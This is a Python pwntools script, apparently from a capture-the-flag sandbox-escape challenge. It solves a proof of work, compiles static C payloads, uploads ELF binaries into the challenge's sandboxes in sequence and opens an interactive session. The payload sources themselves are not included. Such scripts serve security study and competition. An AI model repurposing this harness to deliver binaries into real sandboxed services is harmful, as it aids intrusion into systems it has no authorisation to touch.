from __future__ import print_function
from pwn import *
import sys, random, string, struct
from hashlib import sha256
import glob
import time

context.log_level = "debug"

def proof_of_work_okay(chall, solution, hardness):
    h = sha256(chall.encode('ASCII') + struct.pack('<Q', solution)).hexdigest()
    return int(h, 16) < 2**256 / hardness

def random_string(length = 10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def solve_proof_of_work(task):
    hardness, task = task.split('_')
    hardness = int(hardness)

    ''' You can use this to solve the proof of work. '''
    print('Creating proof of work for {} (hardness {})'.format(task, hardness))
    i = 0
    while True:
        if i % 1000000 == 0: print('Progress: %d' % i)
        if proof_of_work_okay(task, i, hardness):
            return i
        i += 1

def connect_to_remote():
    r  = remote("35.246.140.24", 1)
    r.recvuntil("Proof of work challenge: ")
    chal = r.recvline().strip().decode("utf8")
    resp = solve_proof_of_work(chal)
    print(resp)
    r.recvuntil("Your response? ")
    r.sendline(str(resp))
    return r

def build_payloads(payloads):
    for p in payloads:
        ret = os.system(f"gcc --static -Wl,--gc-sections -Os -o {p} payloads/{p}.c && strip -s -R .comment {p}")
        if ret != 0:
            os.exit(1)

def connect_to_local():
    r  = remote("localhost", 1337)
    return r

def send_elf(r, fname):
    data = open(fname,"rb").read()
    print(f"sending {fname}") 
    r.recvuntil("elf len? ")
    r.sendline(f"{len(data)}")
    r.recvuntil("data? ")
    CHUNK_SIZE = 0x1000
    context.log_level = "warn"
    for i in range(0, len(data), CHUNK_SIZE):
        r.send(data[i: i+CHUNK_SIZE])
        time.sleep(0.01)
    context.log_level = "debug"
    # r.sendline("")

def run_elf(r, sandbox, fname):
    r.sendline("2")
    r.readuntil("which sandbox? ") 
    r.sendline(f"{sandbox}")
    send_elf(r, fname)

def run_sb(r, fname):
    r.sendline("1")
    send_elf(r, fname)

def wait():
    print("Press enter to continue")
    input()

PAYLOADS = [
            "sleep",
            "server",
            "client",
           ]

def main():
    build_payloads(PAYLOADS)
    r = connect_to_local()
    r.recvuntil(">")
    # send_elf(r, "namespaces")
    # send_elf(r, "busybox")
    # run_elf(r, 0, "/bin/ls")
    run_sb(r, "sleep")
    run_elf(r, 0, "server")
    run_sb(r, "sleep")
    run_elf(r, 1, "client")
    wait()
    run_elf(r, 0, "attach")
    r.interactive()

if __name__ == "__main__":
    main()
